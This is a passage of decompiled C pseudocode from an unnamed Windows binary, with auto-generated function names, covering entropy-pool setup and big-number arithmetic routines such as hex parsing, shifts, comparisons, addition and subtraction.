        sub_415930(a2, &v13, v11);
        v10 = a3 == v11;
        a3 -= v11;
        a2 += v11;
        if ( v10 )
          goto LABEL_22;
      }
    }
    else
    {
LABEL_22:
      v7 = sub_406F60(a1, (int)v12);
      if ( !v7 )
        ++a1[4];
    }
    goto LABEL_24;
  }
  result = sub_407060((int)a1, a5, a4);
  if ( !result )
    goto LABEL_12;
  return result;
}
// 407150: using guessed type __m128i var_14;

//----- (004072A0) --------------------------------------------------------
int __cdecl sub_4072A0(_DWORD *a1, unsigned int a2, unsigned int a3)
{
  return sub_407150(a1, a2, a3, 0, 0);
}

//----- (004072C0) --------------------------------------------------------
int __usercall sub_4072C0@<eax>(_DWORD *a1@<esi>)
{
  int v1; // eax
  _DWORD *v2; // ecx
  int result; // eax
  _DWORD *v4; // ecx

  a1[56] = 0;
  sub_413EB0((int)(a1 + 57), 0, 0x190u);
  *a1 = 0;
  sub_413EB0((int)(a1 + 2), 0, 0xD8u);
  v1 = a1[56];
  if ( v1 < 20 )
  {
    v2 = &a1[5 * v1];
    v2[57] = sub_40AE60;
    v2[58] = 0;
    a1[5 * v1 + 60] = 32;
    v2[61] = 1;
    ++a1[56];
  }
  result = a1[56];
  if ( result < 20 )
  {
    v4 = &a1[5 * result];
    result = 5 * result + 60;
    v4[57] = sub_40AED0;
    v4[58] = 0;
    a1[result] = 4;
    v4[61] = 0;
    ++a1[56];
  }
  return result;
}

//----- (00407370) --------------------------------------------------------
int __usercall sub_407370@<eax>(unsigned int a1@<eax>, _DWORD *a2@<edx>, const __m128i *a3@<ecx>, char a4)
{
  unsigned int v5; // ebx
  int v6; // edi
  bool v7; // zf
  int v8; // esi
  char v10[64]; // [esp+10h] [ebp-4Ch] BYREF
  const __m128i *v11; // [esp+50h] [ebp-Ch]
  _BYTE v12[8]; // [esp+54h] [ebp-8h] BYREF

  v5 = a1;
  v11 = a3;
  if ( a1 > 0x40 )
  {
    v6 = sub_40C4D0(v10, a3, a1, 0);
    if ( v6 )
      goto LABEL_8;
    v11 = (const __m128i *)v10;
    v5 = 64;
  }
  v7 = *a2 == 0;
  v12[0] = a4;
  v12[1] = v5;
  if ( !v7 || (v6 = sub_40AF00(a2 + 2, 0)) == 0 )
  {
    *a2 = 1;
    v8 = (int)(a2 + 2);
    v6 = sub_40BF50(v8, (const __m128i *)v12, 2u);
    if ( !v6 )
      v6 = sub_40BF50(v8, v11, v5);
  }
LABEL_8:
  sub_413EB0((int)v10, 0, 0x40u);
  return v6;
}

//----- (00407410) --------------------------------------------------------
int __cdecl sub_407410(_DWORD *a1)
{
  int v1; // eax
  int v2; // ebx
  int (__cdecl **v4)(int, __m128i *, int, unsigned int *); // edi
  int (__cdecl *v5)(int, __m128i *, int, unsigned int *); // eax
  int v6; // esi
  int (__cdecl *v7)(int, __m128i *, int, unsigned int *); // [esp-10h] [ebp-ACh]
  __m128i v8[8]; // [esp+10h] [ebp-8Ch] BYREF
  int v9; // [esp+90h] [ebp-Ch]
  unsigned int v10; // [esp+94h] [ebp-8h] BYREF

  v1 = a1[56];
  v2 = 0;
  v9 = 0;
  if ( !v1 )
    return -64;
  if ( v1 <= 0 )
  {
LABEL_13:
    v6 = -61;
  }
  else
  {
    v4 = (int (__cdecl **)(int, __m128i *, int, unsigned int *))(a1 + 57);
    while ( 1 )
    {
      if ( v4[4] == (int (__cdecl *)(int, __m128i *, int, unsigned int *))1 )
        v9 = 1;
      v5 = *v4;
      v7 = v4[1];
      v10 = 0;
      v6 = v5((int)v7, v8, 128, &v10);
      if ( v6 )
        break;
      if ( v10 )
      {
        v6 = sub_407370(v10, a1, v8, v2);
        if ( v6 )
          return v6;
        v4[2] = (int (__cdecl *)(int, __m128i *, int, unsigned int *))((char *)v4[2] + v10);
      }
      ++v2;
      v4 += 5;
      if ( v2 >= a1[56] )
      {
        if ( v9 )
          break;
        goto LABEL_13;
      }
    }
  }
  sub_413EB0((int)v8, 0, 0x80u);
  return v6;
}
// 407410: using guessed type __m128i var_8C[8];

//----- (004074E0) --------------------------------------------------------
int __cdecl sub_4074E0(_DWORD *a1, unsigned int a2, unsigned int a3)
{
  int v3; // esi
  int v5; // eax
  int v6; // edi
  int v7; // ecx
  int v8; // edx
  _DWORD *v9; // eax
  _DWORD *v10; // esi
  int v11; // eax
  _DWORD *v12; // ecx
  __m128i v13[4]; // [esp+10h] [ebp-40h] BYREF

  v3 = 0;
  if ( a3 > 0x40 )
    return -60;
  do
  {
    v5 = v3++;
    if ( v5 > 256 )
    {
      v6 = -60;
      goto LABEL_20;
    }
    v6 = sub_407410(a1);
    if ( v6 )
      goto LABEL_20;
    v7 = a1[56];
    v8 = 1;
    if ( v7 <= 0 )
      break;
    v9 = a1 + 59;
    do
    {
      if ( *v9 < v9[1] )
        v8 = 0;
      v9 += 5;
      --v7;
    }
    while ( v7 );
  }
  while ( !v8 );
  sub_413EB0((int)v13, 0, 0x40u);
  v10 = a1 + 2;
  v6 = sub_40C010(v13, (int)(a1 + 2));
  if ( !v6 )
  {
    if ( a1 != (_DWORD *)-8 )
      sub_413EB0((int)(a1 + 2), 0, 0xD8u);
    sub_413EB0((int)(a1 + 2), 0, 0xD8u);
    *v10 = 0;
    a1[3] = 0;
    a1[4] = 0;
    a1[5] = 0;
    a1[6] = -205731576;
    a1[7] = 1779033703;
    a1[8] = -2067093701;
    a1[9] = -1150833019;
    a1[10] = -23791573;
    a1[11] = 1013904242;
    a1[12] = 1595750129;
    a1[13] = -1521486534;
    a1[14] = -1377402159;
    a1[15] = 1359893119;
    a1[16] = 725511199;
    a1[17] = -1694144372;
    a1[18] = -79577749;
    a1[19] = 528734635;
    a1[20] = 327033209;
    a1[21] = 1541459225;
    a1[54] = 0;
    v6 = sub_40BF50((int)v10, v13, 0x40u);
    if ( !v6 )
    {
      v11 = sub_40C4D0(v13, v13, 0x40u, 0);
      v6 = v11;
      if ( !v11 )
      {
        if ( (int)a1[56] > 0 )
        {
          v12 = a1 + 59;
          do
          {
            *v12 = 0;
            ++v11;
            v12 += 5;
          }
          while ( v11 < a1[56] );
        }
        sub_415930(a2, v13, a3);
        v6 = 0;
      }
    }
  }
LABEL_20:
  sub_413EB0((int)v13, 0, 0x40u);
  return v6;
}
// 4074E0: using guessed type __m128i var_40[4];

//----- (004076A0) --------------------------------------------------------
int __usercall sub_4076A0@<eax>(_DWORD *a1@<esi>)
{
  int v1; // ecx
  int result; // eax

  if ( a1 )
  {
    v1 = a1[2];
    if ( v1 )
    {
      if ( 4 * a1[1] )
        sub_413EB0(v1, 0, 4 * a1[1]);
      result = off_423FA4(a1[2]);
    }
    *a1 = 1;
    a1[1] = 0;
    a1[2] = 0;
  }
  return result;
}
// 423FA4: using guessed type int (__cdecl *off_423FA4)(_DWORD);

//----- (004076F0) --------------------------------------------------------
int __usercall sub_4076F0@<eax>(unsigned int a1@<ebx>, int a2@<esi>)
{
  unsigned int v3; // edi
  const __m128i *v4; // eax

  if ( a1 > 0x2710 )
    return -16;
  if ( *(_DWORD *)(a2 + 4) < a1 )
  {
    v3 = off_423FA0(a1, 4);
    if ( !v3 )
      return -16;
    v4 = *(const __m128i **)(a2 + 8);
    if ( v4 )
    {
      sub_415930(v3, v4, 4 * *(_DWORD *)(a2 + 4));
      if ( 4 * *(_DWORD *)(a2 + 4) )
        sub_413EB0(*(_DWORD *)(a2 + 8), 0, 4 * *(_DWORD *)(a2 + 4));
      off_423FA4(*(_DWORD *)(a2 + 8));
    }
    *(_DWORD *)(a2 + 4) = a1;
    *(_DWORD *)(a2 + 8) = v3;
  }
  return 0;
}
// 423FA0: using guessed type int (__cdecl *off_423FA0)(_DWORD, _DWORD);
// 423FA4: using guessed type int (__cdecl *off_423FA4)(_DWORD);

//----- (00407770) --------------------------------------------------------
int __usercall sub_407770@<eax>(_DWORD *a1@<eax>, _DWORD *a2)
{
  _DWORD *v2; // ebx
  int v4; // eax
  int v6; // edi
  _DWORD *v7; // eax
  unsigned int v8; // eax
  unsigned int v9; // edi
  unsigned int v10; // ebx
  const __m128i *v11; // eax

  v2 = a2;
  if ( a1 == a2 )
    return 0;
  v4 = a2[2];
  if ( !v4 )
  {
    sub_4076A0(a1);
    return 0;
  }
  v6 = a2[1] - 1;
  if ( a2[1] != 1 )
  {
    v7 = (_DWORD *)(v4 + 4 * v6);
    do
    {
      if ( *v7 )
        break;
      --v7;
      --v6;
    }
    while ( v6 );
  }
  *a1 = *a2;
  v8 = a1[1];
  v9 = v6 + 1;
  if ( v8 >= v9 )
  {
    sub_413EB0(a1[2] + 4 * v9, 0, 4 * (v8 - v9));
  }
  else
  {
    if ( v9 > 0x2710 )
      return -16;
    v10 = off_423FA0(v9, 4);
    if ( !v10 )
      return -16;
    v11 = (const __m128i *)a1[2];
    if ( v11 )
    {
      sub_415930(v10, v11, 4 * a1[1]);
      if ( 4 * a1[1] )
        sub_413EB0(a1[2], 0, 4 * a1[1]);
      off_423FA4(a1[2]);
    }
    a1[2] = v10;
    v2 = a2;
    a1[1] = v9;
  }
  sub_415930(a1[2], (const __m128i *)v2[2], 4 * v9);
  return 0;
}
// 423FA0: using guessed type int (__cdecl *off_423FA0)(_DWORD, _DWORD);
// 423FA4: using guessed type int (__cdecl *off_423FA4)(_DWORD);

//----- (00407880) --------------------------------------------------------
int __usercall sub_407880@<eax>(int a1@<ebx>, _DWORD *a2@<esi>)
{
  unsigned int v2; // edi
  int result; // eax
  const __m128i *v4; // eax

  if ( !a2[1] )
  {
    v2 = off_423FA0(1, 4);
    if ( !v2 )
      return -16;
    v4 = (const __m128i *)a2[2];
    if ( v4 )
    {
      sub_415930(v2, v4, 4 * a2[1]);
      if ( 4 * a2[1] )
        sub_413EB0(a2[2], 0, 4 * a2[1]);
      off_423FA4(a2[2]);
    }
    a2[1] = 1;
    a2[2] = v2;
  }
  sub_413EB0(a2[2], 0, 4 * a2[1]);
  *(_DWORD *)a2[2] = abs32(a1);
  result = 0;
  *a2 = 2 * (a1 >= 0) - 1;
  return result;
}
// 423FA0: using guessed type int (__cdecl *off_423FA0)(_DWORD, _DWORD);
// 423FA4: using guessed type int (__cdecl *off_423FA4)(_DWORD);

//----- (00407920) --------------------------------------------------------
int __usercall sub_407920@<eax>(int a1@<eax>)
{
  int result; // eax
  int v3; // ecx
  _DWORD *v4; // eax
  int v5; // esi
  unsigned int v6; // eax
  unsigned int v7; // edx
  unsigned int v8; // eax
  unsigned int v9; // eax
  unsigned int v10; // eax

  result = *(_DWORD *)(a1 + 4);
  if ( result )
  {
    v3 = result - 1;
    if ( result != 1 )
    {
      v4 = (_DWORD *)(*(_DWORD *)(a1 + 8) + 4 * v3);
      do
      {
        if ( *v4 )
          break;
        --v4;
        --v3;
      }
      while ( v3 );
    }
    v5 = *(_DWORD *)(*(_DWORD *)(a1 + 8) + 4 * v3);
    v6 = 0x80000000;
    v7 = 0;
    while ( (v5 & v6) == 0 )
    {
      v8 = v6 >> 1;
      if ( (v5 & v8) != 0 )
        return 32 * (v3 + 1) - (v7 + 1);
      v9 = v8 >> 1;
      if ( (v5 & v9) != 0 )
        return 32 * (v3 + 1) - (v7 + 2);
      v10 = v9 >> 1;
      if ( (v5 & v10) != 0 )
      {
        v7 += 3;
        return 32 * (v3 + 1) - v7;
      }
      v7 += 4;
      v6 = v10 >> 1;
      if ( v7 >= 0x20 )
        return 32 * (v3 + 1) - v7;
    }
    return 32 * (v3 + 1) - v7;
  }
  return result;
}

//----- (004079B0) --------------------------------------------------------
int __cdecl sub_4079B0(_DWORD *a1, const char *a2)
{
  unsigned int v2; // eax
  int result; // eax
  unsigned int v4; // esi
  unsigned int v5; // edi
  char v6; // al
  unsigned int v7; // edx
  _DWORD *v8; // ebx
  unsigned int v9; // edx
  unsigned int v10; // [esp+0h] [ebp-4h]

  v2 = strlen(a2);
  v10 = v2;
  if ( v2 > 0x3FFFFFFF )
    return -4;
  result = sub_4076F0(((v2 >> 3) & 0x7FFFFFF) + ((v2 & 7) != 0), (int)a1);
  if ( !result )
  {
    result = sub_407880(0, a1);
    if ( !result )
    {
      v4 = v10;
      v5 = 0;
      if ( v10 )
      {
        while ( v4 != 1 || *a2 != 45 )
        {
          v6 = a2[v4 - 1];
          v7 = 255;
          if ( (unsigned __int8)(v6 - 48) <= 9u )
            v7 = v6 - 48;
          if ( (unsigned __int8)(v6 - 65) <= 5u )
            v7 = v6 - 55;
          if ( (unsigned __int8)(v6 - 97) <= 5u )
            v7 = v6 - 87;
          if ( v7 >= 0x10 )
            return -6;
          v8 = (_DWORD *)(a1[2] + 4 * (v5 >> 3));
          v9 = v7 << (4 * (v5 & 7));
          result = 0;
          ++v5;
          *v8 |= v9;
          if ( !--v4 )
            return result;
        }
        *a1 = -1;
      }
    }
  }
  return result;
}

//----- (00407AB0) --------------------------------------------------------
int __usercall sub_407AB0@<eax>(int result@<eax>, int *a2@<ecx>)
{
  int *v2; // edi
  int v3; // edx
  int *v4; // eax
  int v5; // ecx
  int *v6; // ecx
  int v7; // esi
  int *v8; // ecx
  int v9; // [esp+0h] [ebp-8h] BYREF
  int *i; // [esp+4h] [ebp-4h]

  if ( result )
  {
    v2 = &a2[result - 1];
    for ( i = a2; a2 <= v2; i = a2 )
    {
      v3 = 0;
      v9 = *a2;
      v4 = &v9;
      v5 = 4;
      do
      {
        v3 = *(unsigned __int8 *)v4 | (v3 << 8);
        v4 = (int *)((char *)v4 + 1);
        --v5;
      }
      while ( v5 );
      result = 0;
      v9 = *v2;
      v6 = &v9;
      v7 = 4;
      do
      {
        result = *(unsigned __int8 *)v6 | (result << 8);
        v6 = (int *)((char *)v6 + 1);
        --v7;
      }
      while ( v7 );
      v8 = i;
      *i = result;
      *v2 = v3;
      a2 = v8 + 1;
      --v2;
    }
  }
  return result;
}

//----- (00407B20) --------------------------------------------------------
int __usercall sub_407B20@<eax>(_DWORD *a1@<esi>, const __m128i *a2, unsigned int a3)
{
  unsigned int v3; // edi
  int v4; // eax
  int v5; // ecx
  unsigned int v6; // eax
  unsigned int v8; // ebx
  const __m128i *v9; // eax
  unsigned int v10; // ebx
  int v11; // ebx
  const __m128i *v12; // eax

  v3 = ((a3 & 3) != 0) + (a3 >> 2);
  v4 = a1[1];
  if ( v4 != v3 )
  {
    v5 = a1[2];
    if ( v5 )
    {
      v6 = 4 * v4;
      if ( v6 )
        sub_413EB0(v5, 0, v6);
      off_423FA4(a1[2]);
    }
    *a1 = 1;
    a1[1] = 0;
    a1[2] = 0;
    if ( v3 > 0x2710 )
      return -16;
    if ( v3 )
    {
      v8 = off_423FA0(v3, 4);
      if ( !v8 )
        return -16;
      v9 = (const __m128i *)a1[2];
      if ( v9 )
      {
        sub_415930(v8, v9, 4 * a1[1]);
        if ( 4 * a1[1] )
          sub_413EB0(a1[2], 0, 4 * a1[1]);
        off_423FA4(a1[2]);
      }
      a1[1] = v3;
      a1[2] = v8;
    }
  }
  if ( a1[1] )
    goto LABEL_23;
  v10 = off_423FA0(1, 4);
  if ( v10 )
  {
    v12 = (const __m128i *)a1[2];
    if ( v12 )
    {
      sub_415930(v10, v12, 4 * a1[1]);
      if ( 4 * a1[1] )
        sub_413EB0(a1[2], 0, 4 * a1[1]);
      off_423FA4(a1[2]);
    }
    a1[1] = 1;
    a1[2] = v10;
LABEL_23:
    v11 = 0;
    sub_413EB0(a1[2], 0, 4 * a1[1]);
    *(_DWORD *)a1[2] = 0;
    *a1 = 1;
    goto LABEL_24;
  }
  v11 = -16;
LABEL_24:
  if ( !v11 )
  {
    if ( a2 )
    {
      sub_415930(4 * v3 - a3 + a1[2], a2, a3);
      sub_407AB0(v3, (int *)a1[2]);
    }
  }
  return v11;
}
// 423FA0: using guessed type int (__cdecl *off_423FA0)(_DWORD, _DWORD);
// 423FA4: using guessed type int (__cdecl *off_423FA4)(_DWORD);

//----- (00407CC0) --------------------------------------------------------
int __fastcall sub_407CC0(unsigned int a1, int a2, int a3)
{
  unsigned int v3; // eax
  int v4; // edi
  unsigned int v5; // ebx
  unsigned int v6; // eax
  _BYTE *v7; // esi
  int v8; // edx
  unsigned int v10; // esi

  v3 = 4 * *(_DWORD *)(a3 + 4);
  v4 = a2;
  if ( v3 < a1 )
  {
    v4 = a1 + a2 - v3;
    v5 = 4 * *(_DWORD *)(a3 + 4);
    sub_413EB0(a2, 0, a1 - v3);
LABEL_3:
    v6 = 0;
    if ( v5 )
    {
      v7 = (_BYTE *)(v4 + v5 - 1);
      do
      {
        v8 = *(_DWORD *)(*(_DWORD *)(a3 + 8) + 4 * (v6 >> 2)) >> (8 * (v6 & 3));
        ++v6;
        *v7-- = v8;
      }
      while ( v6 < v5 );
    }
    return 0;
  }
  v5 = a1;
  v10 = a1;
  if ( a1 >= v3 )
    goto LABEL_3;
  while ( !(unsigned __int8)(*(_DWORD *)(*(_DWORD *)(a3 + 8) + 4 * (v10 >> 2)) >> (8 * (v10 & 3))) )
  {
    if ( ++v10 >= v3 )
    {
      v5 = a1;
      goto LABEL_3;
    }
  }
  return -8;
}

//----- (00407D70) --------------------------------------------------------
int __usercall sub_407D70@<eax>(unsigned int a1@<eax>, int a2@<esi>)
{
  unsigned int v2; // edi
  unsigned int v3; // eax
  unsigned int v4; // eax
  unsigned int v6; // ebx
  const __m128i *v7; // eax
  unsigned int v8; // eax
  int v9; // edx
  char i; // cl
  int v11; // eax
  unsigned int v12; // edx
  unsigned int v13; // [esp+8h] [ebp-Ch]
  unsigned int v14; // [esp+Ch] [ebp-8h]
  int v15; // [esp+10h] [ebp-4h]

  v15 = a1 & 0x1F;
  v14 = 0;
  v2 = a1 >> 5;
  v3 = a1 + sub_407920(a2);
  if ( 32 * *(_DWORD *)(a2 + 4) < v3 )
  {
    v4 = ((v3 & 0x1F) != 0) + (v3 >> 5);
    v13 = v4;
    if ( v4 > 0x2710 )
      return -16;
    if ( *(_DWORD *)(a2 + 4) < v4 )
    {
      v6 = off_423FA0(v4, 4);
      if ( !v6 )
        return -16;
      v7 = *(const __m128i **)(a2 + 8);
      if ( v7 )
      {
        sub_415930(v6, v7, 4 * *(_DWORD *)(a2 + 4));
        if ( 4 * *(_DWORD *)(a2 + 4) )
          sub_413EB0(*(_DWORD *)(a2 + 8), 0, 4 * *(_DWORD *)(a2 + 4));
        off_423FA4(*(_DWORD *)(a2 + 8));
      }
      *(_DWORD *)(a2 + 4) = v13;
      *(_DWORD *)(a2 + 8) = v6;
    }
  }
  if ( v2 )
  {
    v8 = *(_DWORD *)(a2 + 4);
    if ( v8 > v2 )
    {
      v9 = 4 * (v8 - v2);
      do
      {
        *(_DWORD *)(*(_DWORD *)(a2 + 8) + 4 * v8-- - 4) = *(_DWORD *)(v9 + *(_DWORD *)(a2 + 8) - 4);
        v9 -= 4;
      }
      while ( v8 > v2 );
    }
    for ( ; v8; *(_DWORD *)(*(_DWORD *)(a2 + 8) + 4 * v8) = 0 )
      --v8;
  }
  if ( v15 && v2 < *(_DWORD *)(a2 + 4) )
  {
    for ( i = 32 - v15; ; i = 32 - v15 )
    {
      v11 = *(_DWORD *)(a2 + 8);
      v12 = *(_DWORD *)(v11 + 4 * v2);
      *(_DWORD *)(v11 + 4 * v2) = v12 << v15;
      *(_DWORD *)(*(_DWORD *)(a2 + 8) + 4 * v2++) |= v14;
      v14 = v12 >> i;
      if ( v2 >= *(_DWORD *)(a2 + 4) )
        break;
    }
  }
  return 0;
}
// 423FA0: using guessed type int (__cdecl *off_423FA0)(_DWORD, _DWORD);
// 423FA4: using guessed type int (__cdecl *off_423FA4)(_DWORD);

//----- (00407EC0) --------------------------------------------------------
int __usercall sub_407EC0@<eax>(unsigned int a1@<eax>, _DWORD *a2@<ecx>)
{
  unsigned int v3; // edx
  int v5; // eax
  unsigned int v6; // ecx
  int v7; // ebx
  unsigned int v8; // eax
  int v9; // edi
  int v10; // edi
  char v11; // cl
  int v12; // edx
  unsigned int v13; // eax
  unsigned int *v14; // ebx
  int v15; // edx
  int v16; // ecx
  char i; // [esp+8h] [ebp-Ch]
  int v19; // [esp+Ch] [ebp-8h]
  int v20; // [esp+10h] [ebp-4h]

  v3 = a2[1];
  v5 = a1 & 0x1F;
  v6 = a1 >> 5;
  v7 = v5;
  v19 = 0;
  v20 = v5;
  if ( v6 > v3 || v6 == v3 && v5 )
    return sub_407880(0, a2);
  if ( v6 )
  {
    v8 = 0;
    if ( v3 != v6 )
    {
      v9 = 4 * v6;
      do
      {
        *(_DWORD *)(a2[2] + 4 * v8++) = *(_DWORD *)(v9 + a2[2]);
        v9 += 4;
      }
      while ( v8 < a2[1] - v6 );
      v7 = v20;
    }
    for ( ; v8 < a2[1]; ++v8 )
      *(_DWORD *)(a2[2] + 4 * v8) = 0;
  }
  if ( v7 )
  {
    v10 = a2[1];
    if ( v10 )
    {
      v11 = 32 - v7;
      for ( i = 32 - v7; ; v11 = i )
      {
        v12 = a2[2];
        v13 = *(_DWORD *)(v12 + 4 * v10 - 4);
        v14 = (unsigned int *)(v12 + 4 * v10 - 4);
        v15 = v13 << v11;
        v16 = v19;
        v19 = v15;
        *v14 = v13 >> v20;
        *(_DWORD *)(a2[2] + 4 * v10-- - 4) |= v16;
        if ( !v10 )
          break;
      }
    }
  }
  return 0;
}

//----- (00407FA0) --------------------------------------------------------
int __usercall sub_407FA0@<eax>(int a1@<eax>, int a2@<ecx>)
{
  unsigned int v4; // eax
  _DWORD *v5; // ecx
  unsigned int v6; // ecx
  _DWORD *v7; // edx
  bool v8; // cc
  _DWORD *v10; // edx
  _DWORD *i; // ecx

  v4 = *(_DWORD *)(a2 + 4);
  if ( v4 )
  {
    v5 = (_DWORD *)(*(_DWORD *)(a2 + 8) + 4 * v4 - 4);
    do
    {
      if ( *v5 )
        break;
      --v5;
      --v4;
    }
    while ( v4 );
  }
  v6 = *(_DWORD *)(a1 + 4);
  if ( v6 )
  {
    v7 = (_DWORD *)(*(_DWORD *)(a1 + 8) + 4 * v6 - 4);
    do
    {
      if ( *v7 )
        break;
      --v7;
      --v6;
    }
    while ( v6 );
  }
  if ( v4 )
  {
    v8 = v6 <= v4;
    if ( v6 < v4 )
      return 1;
  }
  else
  {
    if ( !v6 )
      return 0;
    v8 = 0;
  }
  if ( !v8 )
    return -1;
  if ( v4 )
  {
    v10 = (_DWORD *)(*(_DWORD *)(a1 + 8) + 4 * v4 - 4);
    for ( i = (_DWORD *)(*(_DWORD *)(a2 + 8) + 4 * v4 - 4); *i <= *v10; --i )
    {
      if ( *i < *v10 )
        return -1;
      --v10;
      if ( !--v4 )
        return 0;
    }
    return 1;
  }
  return 0;
}

//----- (00408030) --------------------------------------------------------
int __usercall sub_408030@<eax>(int *a1@<eax>, int *a2@<ecx>)
{
  unsigned int v3; // ecx
  _DWORD *v5; // eax
  int result; // eax
  _DWORD *v7; // edx
  bool v8; // cc
  bool v9; // cc
  _DWORD *v10; // esi
  _DWORD *i; // edx

  v3 = a2[1];
  if ( v3 )
  {
    v5 = (_DWORD *)(a2[2] + 4 * v3 - 4);
    do
    {
      if ( *v5 )
        break;
      --v5;
      --v3;
    }
    while ( v3 );
  }
  result = a1[1];
  if ( result )
  {
    v7 = (_DWORD *)(a1[2] + 4 * result - 4);
    do
    {
      if ( *v7 )
        break;
      --v7;
      --result;
    }
    while ( result );
  }
  if ( v3 )
  {
    v8 = result <= v3;
    if ( result < v3 )
      return *a2;
  }
  else
  {
    if ( !result )
      return result;
    v8 = 0;
  }
  if ( !v8 )
    return -*a1;
  result = *a2;
  if ( *a2 <= 0 )
  {
    v9 = *a1 <= 0;
  }
  else
  {
    v9 = *a1 <= 0;
    if ( *a1 < 0 )
      return 1;
  }
  if ( !v9 && result < 0 )
    return -1;
  if ( !v3 )
    return 0;
  v10 = (_DWORD *)(a1[2] + 4 * v3 - 4);
  for ( i = (_DWORD *)(a2[2] + 4 * v3 - 4); *i <= *v10; --i )
  {
    if ( *i < *v10 )
      return -result;
    --v10;
    if ( !--v3 )
      return 0;
  }
  return result;
}

//----- (004080E0) --------------------------------------------------------
int __usercall sub_4080E0@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>, _DWORD *a3)
{
  _DWORD *v3; // esi
  int result; // eax
  unsigned int v5; // ebx
  _DWORD *v6; // eax
  unsigned int v7; // esi
  const __m128i *v8; // eax
  unsigned int *v9; // eax
  unsigned int *v10; // ecx
  unsigned int v11; // esi
  unsigned int v12; // edx
  int v13; // esi
  unsigned int v14; // ebx
  unsigned int v15; // eax
  unsigned int v16; // eax
  const __m128i *v17; // ecx
  int v18; // esi
  unsigned int v19; // [esp+4h] [ebp-4h]
  unsigned int v20; // [esp+10h] [ebp+8h]
  int v21; // [esp+10h] [ebp+8h]

  v3 = a3;
  if ( a2 == a3 )
  {
    a3 = a1;
    v3 = a1;
  }
  else if ( a2 != a1 )
  {
    result = sub_407770(a2, a1);
    if ( result )
      return result;
  }
  *a2 = 1;
  v5 = v3[1];
  if ( v5 )
  {
    v6 = (_DWORD *)(v3[2] + 4 * v5 - 4);
    do
    {
      if ( *v6 )
        break;
      --v6;
      --v5;
    }
    while ( v5 );
  }
  if ( v5 > 0x2710 )
    return -16;
  if ( a2[1] >= v5 )
    goto LABEL_17;
  v7 = off_423FA0(v5, 4);
  if ( !v7 )
    return -16;
  v8 = (const __m128i *)a2[2];
  if ( v8 )
  {
    sub_415930(v7, v8, 4 * a2[1]);
    if ( 4 * a2[1] )
      sub_413EB0(a2[2], 0, 4 * a2[1]);
    off_423FA4(a2[2]);
  }
  a2[2] = v7;
  v3 = a3;
  a2[1] = v5;
LABEL_17:
  v9 = (unsigned int *)v3[2];
  v10 = (unsigned int *)a2[2];
  v11 = 0;
  if ( !v5 )
    return 0;
  v20 = v5;
  do
  {
    v12 = *v9;
    *v10 += v11;
    v13 = -(*v10 < v11);
    *v10 += v12;
    v11 = (*v10 < v12) - v13;
    ++v9;
    ++v10;
    --v20;
  }
  while ( v20 );
  if ( v11 )
  {
    v21 = 4 * v5;
    v14 = v5 + 1;
    do
    {
      v15 = a2[1];
      if ( v14 - 1 >= v15 )
      {
        if ( v14 > 0x2710 )
          return -16;
        if ( v15 < v14 )
        {
          v16 = off_423FA0(v14, 4);
          v19 = v16;
          if ( !v16 )
            return -16;
          v17 = (const __m128i *)a2[2];
          if ( v17 )
          {
            sub_415930(v16, v17, 4 * a2[1]);
            if ( 4 * a2[1] )
              sub_413EB0(a2[2], 0, 4 * a2[1]);
            off_423FA4(a2[2]);
            v16 = v19;
          }
          a2[1] = v14;
          a2[2] = v16;
        }
        v10 = (unsigned int *)(v21 + a2[2]);
      }
      *v10 += v11;
      v18 = -(*v10 < v11);
      v21 += 4;
      ++v14;
      ++v10;
      v11 = -v18;
    }
    while ( v11 );
  }
  return 0;
}
// 423FA0: using guessed type int (__cdecl *off_423FA0)(_DWORD, _DWORD);
// 423FA4: using guessed type int (__cdecl *off_423FA4)(_DWORD);

//----- (00408290) --------------------------------------------------------
unsigned int *__usercall sub_408290@<eax>(unsigned int *result@<eax>, int a2@<edx>, int a3)
{
  unsigned int v3; // ecx
  int v4; // ebx
  unsigned __int64 v5; // kr00_8
  unsigned int v6; // edi
  BOOL v7; // esi
  int v8; // [esp+0h] [ebp-4h]

  v3 = 0;
  if ( a2 )
  {
    v4 = a3 - (_DWORD)result;
    v8 = a2;
    do
    {
      v5 = *result - (unsigned __int64)v3;
      *result = v5;
      v6 = *(unsigned int *)((char *)result + v4);
      *result -= v6;
      v3 = ((unsigned int)v5 < v6) - HIDWORD(v5);
      ++result;
      --v8;
    }
    while ( v8 );
    if ( v3 )
    {
      do
      {
        v7 = *result < v3;
        *result++ -= v3;
        v3 = v7;
      }
      while ( v7 );
    }
  }
  return result;
}

//----- (004082F0) --------------------------------------------------------
int __usercall sub_4082F0@<eax>(int a1@<eax>, int a2@<edi>, int a3)
{
  _DWORD *v3; // ebx
  int *v4; // esi
  int v6; // ebx
  int v7; // edx
  _DWORD *v8; // eax
  LPVOID v9; // ecx
  int v10; // [esp+8h] [ebp-Ch] BYREF
  int v11; // [esp+Ch] [ebp-8h]
  LPVOID lpMem; // [esp+10h] [ebp-4h]

  v3 = (_DWORD *)a3;
  v4 = (int *)a1;
  if ( sub_407FA0(a1, a3) < 0 )
    return -10;
  v10 = 1;
  v11 = 0;
  lpMem = 0;
  if ( (int *)a2 != v4 )
    goto LABEL_6;
  v6 = sub_407770(&v10, v4);
  if ( !v6 )
  {
    v3 = (_DWORD *)a3;
    v4 = &v10;
LABEL_6:
    if ( (_DWORD *)a2 == v3 || (v6 = sub_407770((_DWORD *)a2, v3)) == 0 )
    {
      *(_DWORD *)a2 = 1;
      v7 = v4[1];
      v6 = 0;
      if ( v7 )
      {
        v8 = (_DWORD *)(v4[2] + 4 * v7 - 4);
        do
        {
          if ( *v8 )
            break;
          --v8;
          --v7;
        }
        while ( v7 );
      }
      sub_408290(*(unsigned int **)(a2 + 8), v7, v4[2]);
    }
  }
  v9 = lpMem;
  if ( lpMem )
  {
    if ( 4 * v11 )
    {
      sub_413EB0((int)lpMem, 0, 4 * v11);
      v9 = lpMem;
    }
    off_423FA4(v9);
  }
  return v6;
}
// 423FA4: using guessed type int (__cdecl *off_423FA4)(_DWORD);

//----- (004083C0) --------------------------------------------------------
int __usercall sub_4083C0@<eax>(_DWORD *a1@<eax>, int *a2@<ebx>, _DWORD *a3@<esi>)
{
  int result; // eax
  int v5; // [esp+4h] [ebp-4h]

  v5 = *a2;
  if ( *a2 * *a3 >= 0 )
  {
    result = sub_4080E0(a2, a1, a3);
    if ( !result )
      *a1 = v5;
  }
  else if ( sub_407FA0((int)a3, (int)a2) < 0 )
  {
    result = sub_4082F0((int)a2, (int)a1, (int)a3);
    if ( !result )
      *a1 = -v5;
  }
  else
  {
    result = sub_4082F0((int)a3, (int)a1, (int)a2);
